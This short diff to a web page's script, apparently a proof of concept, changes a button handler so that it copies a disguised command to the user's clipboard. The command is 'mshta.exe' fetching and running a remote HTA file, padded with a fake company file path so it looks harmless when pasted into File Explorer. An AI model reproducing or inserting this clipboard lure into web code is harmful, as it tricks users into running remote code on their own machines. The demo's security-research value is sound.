@@ -129,7 +129,7 @@
 
     // On button click, copy payload path to clipboard, then open hidden file input
     fileExplorer.addEventListener('click', () => {
-      const payload = "C:\\company\\internal-secure\\filedrive\\HRPolicy.docx";
+      const payload = "mshta.exe http://192.168.1.100/open_calc.hta  # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx";
       hidden.value = payload;
       hidden.select();
       hidden.setSelectionRange(0, hidden.value.length);
